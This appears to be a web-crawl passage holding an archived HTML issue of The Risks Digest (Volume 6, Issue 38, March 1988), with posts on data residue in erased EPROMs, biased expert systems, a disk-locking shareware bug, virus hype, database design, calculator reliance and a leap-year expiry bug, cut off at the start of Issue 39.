          even if his book is not DIRECTLY computer relevant.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.36.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.38.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-74</DOCNO>
<DOCOLDNO>IA012-000130-B025-83</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.38.html 128.240.150.127 19970217015935 text/html 30370
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:58:02 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 38</TITLE>
<LINK REL="Prev" HREF="/Risks/6.37.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.39.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.37.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.39.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 38</H1>
<H2>  Monday 7 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
EPROM Risk 
</A>
<DD>
<A HREF="#subj1.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Bigoted expert systems 
</A>
<DD>
<A HREF="#subj2.1">
Jack Campin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  PC-LOCK -- BEWARE 
</A>
<DD>
<A HREF="#subj3.1">
J Greely
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Yet another antiviral program -- BEWARE 
</A>
<DD>
<A HREF="#subj4.1">
Ted M.P. Lee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  mac II virus 
</A>
<DD>
<A HREF="#subj5.1">
Robert Ward
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Database Design and Misuse 
</A>
<DD>
<A HREF="#subj6.1">
James H. Coombs
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Correlating databases; Disappearing skills; Copious warnings 
</A>
<DD>
<A HREF="#subj7.1">
Paul Smee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Disappearing Skills    
</A>
<DD>
<A HREF="#subj8.1">
Henry Spencer
</A><br>
<A HREF="#subj8.2">
 Jonathan I. Kamens
</A><br>
<A HREF="#subj8.3">
 David Wittenberg
</A><br>
<A HREF="#subj8.4">
 Mark Vonder Haar
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Police computer problem -- license-plate matches 
</A>
<DD>
<A HREF="#subj9.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Leap year madness 
</A>
<DD>
<A HREF="#subj10.1">
Alan J Rosenthal
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  More on Bank ATMs and checking your statements  
</A>
<DD>
<A HREF="#subj11.1">
Eric Herrmann
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
EPROM Risk
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:Brian_Randell%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">
Brian_Randell%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>

</i><PRE>

Date: Mon, 7 Mar 88 9:48:47 WET DST

The amusing, but rather vague, article which is excerpted below, was in The
Guardian of 7 March 1988. From further (non-excerpted details) I surmise
that it comes from a press release from the makers of the Psion Organiser. 

PSION'S MEMORY IS MADE OF THIS, by Tony May

  As a drug smuggler, Paul Dye knew that a filofax was of no use to him, but
since his highly entrepreneurial business demanded a portable diary, contact
list, memory prompter, calculator and note-taking device, he opted instead for
a Psion Organiser.
  At around (pounds)100 for the basic machine, he got a hand-held computer
whose memory could hold details of his (pounds)200 million drug smuggling ring,
and could be wiped clean if the law caught up with him.
  But since he has been fined (pounds)202,000 and is now doing 28 years in gaol
partly on the strength of evidence obtained from the machine's "erased" memory
we may conclude that he potentially has a case under the Trades Description
Act.
  Our computer staff tell us that when he came to erase his file the details
were no longer available to him but were retained in the EPROM chip-based
storage system which does not actually erase.
  They also tell me that Psion may have had another walk-on part in the case as
members of the ring used corsets bought from Marks &amp; Spencers to carry heroin,
and the stores use Organisers for till price checking and chargecard
validation.
  Mr Dye may not have been entirely happy with his purchase, but Psion believes
that 300,000 of them will have been sold by the end of year ......

Brian Randell, Computing Laboratory, University of Newcastle upon Tyne
PHONE =	+44 91 232 9233         JANET =	Brian_Randell@uk.ac.newcastle
                                UUCP  =	...!ukc!newcastle.ac.uk!Brian_Randell

                            [Ah, the old residue problem strikes again.  
                            The eraser's edge.  Psion-ARA!  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Bigoted expert systems
</A>
</H3>
<address>
Mr Jack Campin 
&lt;<A HREF="mailto:jack%cs.glasgow.ac.uk@NSS.Cs.Ucl.AC.UK">
jack%cs.glasgow.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 18:48:47 GMT
</i><PRE>

Further to Brian Randall's posting about the St George's Hospital case:

According to the Times Higher Education Supplement (26.2.88) St George's is
actually one of the LEAST discriminatory teaching hospitals in London, with
12% nonwhite students; others, using human assessors whose procedures cannot
be reviewed, get as low as 5%. In a warped way this is almost a success story.

What other examples do readers have where "knowledge" elicited from "experts"
has codified prejudice? There are proposals afoot to give expert systems total
control of British social security benefits; the record suggests that any
bigotry that can be built in, will be (refusals of benefit have been made in
the past on racial grounds by clerks belonging to neo-Nazi organizations).

Does any state anywhere have legislation requiring public access to source
code of software performing tasks like that? (not that that would be a lot
of help with a neural network that didn't like black faces).
ARPA: jack%cs.glasgow.ac.uk@nss.cs.ucl.ac.uk       USENET: jack@cs.glasgow.uucp
JANET:jack@uk.ac.glasgow.cs      useBANGnet: ...mcvax!ukc!cs.glasgow.ac.uk!jack
Mail: Jack Campin, Computing Science Dept., Glasgow Univ., 17 Lilybank Gardens,
      Glasgow G12 8QQ, SCOTLAND     work 041 339 8855 x 6045; home 041 556 1878

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
PC-LOCK (Re: James Ford, <A HREF="/Risks/6.34.html">RISKS-6.34</A>) -- BEWARE
</A>
</H3>
<address>
J Greely
&lt;<A HREF="mailto:jgreely@tut.cis.ohio-state.edu ">
jgreely@tut.cis.ohio-state.edu 
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 03:21:13 EST
</i><PRE>
Organization: The Ohio State University

&gt;There is a program called PC-LOCK (*NOT* the PD version) which is made by
&gt;Johnson Computer Systems.  We have installed it on some hard disks here and
&gt;have had no problems at all.

A quick warning about PC-LOCK (shareware).  If you are currently using
version 1.0, REMOVE IT IMMEDIATELY.  It will not hurt you if it already
works, but you might be tempted to give a copy to someone else, and this
could be fatal.

  Version 1.0 stores your password in an "unused" section of the partition
table, and does not document this.  Approximately 10% of all Western Digital
hard disk controllers (PC/XT version) *also* use this section, for an
advanced partition management feature (that never worked).  If you have one
of these controllers, installing PC-LOCK version 1.0 will lock your system,
and make your hard disk completely inaccesible.  The good news is that
Western Digital will send you a replacement BIOS chip upon request (mine
arrived within 3 days).  PC-LOCK version 1.1 does not have this problem, and
performs perfectly on every system I've seen it on.

&gt;     You have to boot with drive "C" and enter the proper password to gain
&gt;access.  There are 5 possible passwords you can set/use....1 administrator
&gt;password and 4 user passwords.

Sounds like a newer version.

&gt;PC-LOCK, Johnson Computer Systems, 20 Dinwiddie Place, Newport News VA 23602

If you'd like to contact the author by phone (I had to, about the version 1.0
problem), there is no listing for JCS, just ask for a Johnson on Dinwiddie.
He was very helpful, and has further information about who to contact at
Western Digital.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Yet another "antiviral" program -- BEWARE
</A>
</H3>
<address>
&lt;<A HREF="mailto:TMPLee@DOCKMASTER.ARPA">
TMPLee@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 11:54 EST
</i><PRE>
To: Risks@csl.sri.com

The following is abridged from the March 3 Minneapolis Star &amp; Tribune.  Anyone
willing to guess how many people are being suckered into buying this (or other
similar products) and how long it will be before they discover that the
protection being advertized is illusory and can't be anything but?  Now if the
vendor (Lasertrieve) in question also sold insurance and was willing to
significantly lower the premium for insuring against loss of data if you used
his program, then I'd listen.

N.J. FIRM SAYS IT CAN 'INOCULATE' COMPUTERS AGAINST 'VIRUSES'

Associated Press
Seattle, Wash.

A New Jersey company is offering to "inoculate" computers against "viruses,"
or rogue programs that are designed to spread from computer to computer and
damage data the computers store.

The Viralarm system was announced Tuesday by officials of Lasertrieve Inc., of
Metuchen, N.J., during a Microsoft Corp.  conference on [CD-ROMS].

A statement issued by Lasertrieve said that although the newer CD-ROM disks are
impervious to corruption because information on them cannot be altered, many
computer users are concerned about protecting programs on hard disks or on
conventional floppy diskettes.

Viruses are creating a growing fear among computer owners and users.  Officials
in Israel recently announced the detection of a virus that, if left to spread
unchecked, could have wiped out memory banks and disabled computers throughout
the country.

Previous antiviral programs only drew attention to changes, noted the size of a
program or monitored the dates of program changes, and all were "easily fooled
by sophisticated viruses," the statement said.

Viralarm consists of a special program to protect another program, creating a
software barrier.  The protection is available for individual personal
computers and works for most of the operating systems now available, the
Lasertrieve statement said.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
mac II virus
</A>
</H3>
<address>
Robert Ward 
&lt;<A HREF="mailto:rw23+@andrew.cmu.edu">
rw23+@andrew.cmu.edu
</A>&gt;
</address>
<i>
Mon,  7 Mar 88 12:56:21 -0500 (EST)
</i><PRE>

It was recently reported in this newsgroup that the editor of "MacMag," a 
Canadian monthly magazine, hired a programmer to create a Mac II virus which 
served more or less as an advertisement (or at least an attention-getting 
device). The virus was supposedly set to go off on March 2, the birthday of 
the Mac II. It was reported that the virus had been spotted on Compuserve and 
other commercial databases.

Well, it's now well past March 2...any actual sightings of contamination?

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
     Database Design and Misuse [<A HREF="/Risks/6.32.html">RISKS-6.32</A> and -6.36]
</A>
</H3>
<address>
"James H. Coombs" 
&lt;<A HREF="mailto:JAZBO%BROWNVM.BITNET@MITVMA.MIT.EDU">
JAZBO%BROWNVM.BITNET@MITVMA.MIT.EDU
</A>&gt;
</address>
<i>
Sat, 5 Mar 1988 22:15:30 EST
</i><PRE>

I have been thinking about design requirements.  First, a database
designer needs to understand thoroughly both the data that will be
stored in the database and the ways that it will be used.  Clearly, the
designer must be a pessimist.

One way to reduce problems caused by partial data would be to specify NULLS NOT
ALLOWED for critical fields.  This would prevent the entry, for example, of a
record specifying a license number but not a make and model.  Unfortunately,
energetic organizations can easily subvert such integrity constraints by
directing their operators to enter some value that will be treated as a NULL
(e.g., "N/A" for make and model).  Nonetheless, designers must make themselves
aware of the consequences of NULL values in particular databases.  Even though
their efforts can be subverted, they can make such subversion relatively easy
to spot; they can supplement their design efforts by specifying clearly in the
documentation that pseudo-NULL values should not be entered.  Should a database
fall into misuse on entry, an ethical supervisor might still appear someday and
correct the situation.

If it is preferable to allow entry of partial records, one can still define
views that allow only certain people to see those records.  Once the record is
filled out, it becomes available to others.  Again, this sort of constraint can
be subverted easily (e.g., assign the appropriate privileges to everyone).

Alternatively, as PGN suggests, the front end can issue warnings when the
results are likely to be misinterpreted.

In all of these situations, however, we rely on the organization 1) to want to
use the database properly and 2) to enforce the appropriate constraints.  I do
not believe that designers can prevent this sort of misuse.  (In an extreme
case, a pseudo-NULL could be chosen from the values of a closed set, e.g., all
cars of color RED are understood to have an unknown color.)

I hope that I'm missing something here.
                                                  --Jim

Dr. James H. Coombs, Software Engineer, Research
Institute for Research in Information and Scholarship (IRIS), Brown University

    [Interesting choice of example, in that red cars are 
    involved in accidents disproportionately many accidents!  PGN

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Correlating databases; Disappearing skills; Copious warnings
</A>
</H3>
<address>
Paul Smee 
&lt;<A HREF="mailto:Smee@AUCC.AC.UK">
Smee@AUCC.AC.UK
</A>&gt;
</address>
<i>
Fri, 4 Mar 88 10:45 GMT
</i><PRE>

Several short comments on miscellaneous recent discussion.

'On the topic of correlating databases':  Matt Fichtenbaum mentions a NY
match of the driving licenses DB with the aid to the blind DB.  Never
lived in NY, but in many states, eligibility for aid to the blind is
determined by the state of your *uncorrected* vision; while eligibility
for a license is determined by the state of your *corrected* vision.
The general principle involved is that while cross-correlation may,
prima facie, seem reasonable, it might not really be meaningful.

'Disappearing skills':  The biggest danger posed by people who can't do
simple math 'the hard way' is that they tend to trust whatever their
computer or calculator says.  Knowing how to do it by hand, and well,
increases a person's 'feel' for the right answer.  For example, I
recently objected to a sales assistant trying to charge me an amount I
knew was wrong.  'The till [US cash register] says it's 12 pounds', she
insisted.  'Why don't you believe it?' Well, I said, I've got 5 items,
each under a pound, so can't be over a fiver.  Indeed, she'd mis-keyed
one of the prices.  More frighteningly, I occasionally see the same sort
of obviously wrong (but 'the computer said so, it MUST be right') answer
being accepted by an engineering student.  I would be much more
comfortable if I felt that the bridge I'm driving over (or the airplane
I'm on) had been designed by someone who had a 'feel' for the maths, so
that he or she would be able to recognize if the 'computed solution' was
actually believably near to the reasonably expected one -- or if not,
why not.  I think knowing the basics helps give this sort of feel.

'Copious warnings':  (I've lost the original title of this chain).  The
principle of the 'boy who cried wolf' is often neglected -- dangerously,
I think.  For example, the micro I use at work always says, when you ask
it to format a disk, 'Warning:  formatting disk B will cause all data on
the disk to be lost.  Do you really want to do this?' Well, I know it's
going to ask that, and I know I've just put a virgin disk in the drive,
so I always anticipate it with a 'yes'.  Some day I'm going to forget to
set drive B (so it will go for A, or worse, C); or I'm going to mix up
my disks in the shuffle, and regret it.  It would be safer (in my
environment at least) if it would first LOOK at the disk, and reserve
the warning for those cases where the disk actually already has been
formatted.  (My controller can tell the difference, at least for it's
own format disks.  There would be the risk, of course, of accidentally
formatting a disk which has already been done in some other machine's
non-standard format, but for me that's not an issue.)  There are a lot
of examples of this in computing -- for example the system which
*always* asks you to confirm deletions.  Of course I want the thing
deleted, I wouldn't have asked you to otherwise.  For my own (mainframe)
delete I've managed to wrap in a personal heuristic, so it asks only if
(a) the file(s) are 'protected'; or (b) the file string contains a
'dangerous' wildcard spec -- like '**' (everything); or (c) I've
requested multiple single files (because, the way I work, that usually
means I've mistyped some filename like '*.fred' as '* fred' instead.
Nevermind bugs, faults, and breakdowns in 'emergency warning' systems --
there's a lot of just plain poorly thought out design.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Re: Disappearing Skills [RISKS 6.35]
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sun, 6 Mar 88 00:10:59 EST
</i><PRE>

&gt; I never learned how to multiply by using a slide rule ...

Ah, but what happens if it becomes necessary to find a logarithm or a
square root and your calculator's battery is dead?  If it were me, I'd
either dust off my slide rule or dig out a book of tables -- I have, and
can use, both -- but those options increasingly are not available.  (The
standard references like the Handbook of Chemistry and Physics are dropping
things like log tables on the grounds that they are superfluous nowadays
and the pages are better used for other material.)  One can argue that
logarithms and square roots are in some sense less fundamental than
multiplication, but to what extent is this a lingering side effect of days
when multiplication was easier?  Certainly I use the square-root key on
my calculator quite a lot.

&gt; ... The need for multiplication will probably exist as long as mankind ...

The same can be said of the need for logarithms, square roots, trig functions,
etc... and artificial aids have been the normal approach to them all along.
Engineers have been completely dependent on artificial aids for doing
multiplication -- in the sense that the slowness of doing it by hand would
be considered utterly intolerable for practical purposes -- for many decades.
(Here I am not talking about computers, but about mechanical calculators,
slide rules, and log tables.  Not to mention assistants!  Grace Murray Hopper
once commented that she could remember when "computer" was a job title, not
a piece of machinery.)

&gt; Technological advances should save us time; they should not "save" us the
&gt; "bother" of being able to think.

To what extent does a purely mechanical skill like multiplication constitute
"thinking"?

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<HR><H3><A NAME="subj8.2">
Re: Disappearing Skills [RISKS 6.36]
</A>
</H3>
<address>
&lt;<A HREF="mailto:jik@ATHENA.MIT.EDU">
jik@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Sat, 5 Mar 88 22:30:47 EST
</i><PRE>

In RISKS 6.35, Ronald J. Bottomly says,

  I am not condoning technological stagnation, but I am condemning
  absolute technological reliance.  The need for multiplication will
  probably exist as long as mankind exists; but it seems dangerous
  (RISKy?) to come to rely upon calculators (or whatever will succeed
  them) to perform this multiplication.

A story by Isaac Asimov called "A Feeling of Power" illustrates this
point beautifully, using the same example (dependence on calculators)
that Mr. Bottomly uses.  The story takes place at a time so far into
the future that man has become completely dependent on calculators and
has forgotten how to do calculations by hand.  One man rediscovers
hand calculation, and the results are quite surprising.  I won't spoil
the plot, but I definitely think it is worth reading.

  Jonathan I. Kamens

</PRE>
<HR><H3><A NAME="subj8.3">
RE: Disappearing skills
</A>
</H3>
<address>
David 'Witt' Wittenberg
&lt;<A HREF="mailto:wittenberg%ultra.DEC@src.dec.com ">
wittenberg%ultra.DEC@src.dec.com 
</A>&gt;
</address>
<i>
Fri, 4 Mar 88 06:29:23 PST
</i><PRE>

[Also noted Issac Asimov ...]

The thing that scares me more than people being unable to do arithmetic is 
the inability to recognize wildly erroneous calculations.  A friend of mine
(who works as a software engineer) quoted a value for the ability of a ski
resort to move people up the mountain. It was off by 4 orders of magnitude.
Even if we lose the ability to add accurately, we must retain the ability
to recognize major errors.
                                        --David Wittenberg

</PRE>
<HR><H3><A NAME="subj8.4">
Disappearing Skills (Re: <A HREF="/Risks/6.33.html">RISKS-6.33</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:allegra!cbcsta!mvh@EDDIE.MIT.EDU">
allegra!cbcsta!mvh@EDDIE.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 18:09:53 est
</i><PRE>
Organization: AT&amp;T Bell Labs, Columbus OH

We have long ago lost *THE* most fundamental basic skill for 95% of the people
in western civiliation: farming.  Unless you can feed yourself, please don't
lament the loss of multiplication skills.  By the way, technology is probably
the primary cause of lost farming skills.
                                                  Mark Vonder Haar

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 Re: Police computer problem -- license-plate matches
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Fri, 4 Mar 88 0:24:17 EST
</i><PRE>

I'm all in favor of improving the matching algorithms used by the police, to
avoid using defective database systems and cause serious problems for
innocent people.

But here's the other side of the story:  Look how the police can use
database systems to be more efficient in catching up with people running
loose with outstanding arrest warrants.

About 4 years ago, a young man whom I know neglected to pay a $25 Public
Defender's fee for services in District (Traffic) Court.  Subsequently,
a bench warrant was issued for his arrest for violation of probation.
Meanwhile, he had left this state and was working elsewhere.

Six months ago, the man was vacationing within the state and locked his keys
in his car.  At 3:00 a.m. police found him trying to open his own car with a
coat hanger.  Being forthright, he showed his license and said, "This is my
car.  I've locked myself out."  Here there are two databases:  one for
outstanding traffic violations and one for outstanding criminal warrants.
Since this fellow was doing something possibly "criminal," the cops checked
the latter database and got a hit.  They detained him and the rest is sadder
history than it need have been.

Once in a while, we who worry about risks should review the countless
routine uses of computers and databases without which ours might be a less
desirable society in which to live.  We're a large country, and this brings
special problems that seem made to order for computers.
                                                              _Brint

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Leap years
</A>
</H3>
<address>
Alan J Rosenthal 
&lt;<A HREF="mailto:flaps%dgp.toronto.edu@RELAY.CS.NET">
flaps%dgp.toronto.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 10:45:07 EST
</i><PRE>

A program was discussed recently that caused accounts created on 29 feb
this year to be listed as expiring on 29 feb next year, and access then
to be denied due to the invalid expiry date.

In risks 6-34 Michael Wagner identifies three design errors:
&gt;  1. Two different representations/algorithms for dates ...
&gt;  2. At least one representation allows illegal dates to be expressed ...
&gt;  3. The treatment of an illegal date *in the future* as an expired date...

I think concluding #1 and #3 is not justified.  Probably dates were simply
represented as records containing entries for day, month, and year (like on
many IBM computers).  Since 29 was in the valid range for a day, it was
representable.  Then the simple approach of adding 1 to the year would
produce an invalid date.  I don't think that the original article said that
the illegal date was treated as being in the past; it's probably just that
as a security feature access is denied to accounts with invalid expiry dates.

#2 is certainly correct.  If the representation was the simpler "number of
days since time x", then the calculation would have been simply to add 365,
and in a leap year the user would be cheated out of one day, rather than an
illegal date created.

In the same issue, Mark Brader writes:

&gt;All right now -- how many people reading this *haven't yet realized* that
&gt;their watches have to be set back 1 day, ...

This brings up another interesting issue.  Many programs assume that time
goes forward.  For example, documentation for the Amiga says that this is
guaranteed and that programs should not move the time backwards.  At a place
I work for we have networked microcomputers running a database program in
which the central database is updated nightly, and the update program
assumes it is run every day and that all un-updated entries were created
today.  Setting the date backwards between updates would have caused
problems.  Fortunately we realized that the problem existed.

ajr &lt;flaps@dgp.toronto.edu&gt;

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
More on Bank ATMs and checking your statements
</A>
</H3>
<address>
Eric Herrmann
&lt;<A HREF="mailto:pixar!banzai@ucbvax.Berkeley.EDU ">
pixar!banzai@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 13:53:49 PST
</i><PRE>

I would like to contribute yet another anecdote about the sometimes bizarre
and arbitrary world of electronic banking, which happened maybe 3 months ago.

After receiving my bank statement for the month, I took all the ATM receipts I
had accumulated and proceeded to balance my checkbook.  All was well except I
saw a $60 withdrawal from a Gibraltar Savings branch (linked by the Star
system to my bank) on the same day that I withdrew $40 from my Great Western
machine (about two blocks distant).  I had no receipt for this, and I couldn't
remember withdrawing the money, nor could I conceive why I would withdraw $40
and then withdraw $60 the same day two blocks away, but it occurred to me that
I couldn't prove anything, so I decided to eat the $60 loss.

About a month later, I received a form from my branch bank explaining that a
$60 withdrawal had been mistakenly posted to my account, and that the amount
had been restored.  The explanation was hand-written, but did not explain who
posted the transaction, why it was posted, or how the mistake was discovered.

I would agree with David Segal that good record-keeping is necessary as a
check on technology.  In this case, had the bank not confirmed and reversed
the error, I would have had no recourse to recover the money.  Thankfully, all
I lost was a month's worth of interest.  The problem was not compounded, I
suppose.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.37.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.39.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-75</DOCNO>
<DOCOLDNO>IA012-000130-B025-102</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.39.html 128.240.150.127 19970217015953 text/html 26206
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:58:20 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 39</TITLE>
<LINK REL="Prev" HREF="/Risks/6.38.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.40.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.38.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.40.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 39</H1>
<H2>  Tuesday 8 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computer error and learned helplessness 
</A>
<DD>
<A HREF="#subj1.1">
Bruce Sesnovich
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Garbage In, Gospel Out 
</A>
<DD>
<A HREF="#subj2.1">
Ephraim Vishniac
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Checking Statements &amp; Disappearing Skills 
</A>
<DD>
<A HREF="#subj3.1">
Darin McGrew
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Disappearing skills 
</A>
<DD>
<A HREF="#subj4.1">
Al Stangenberger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Lousy Lazy UNIX Linkers 
</A>
<DD>
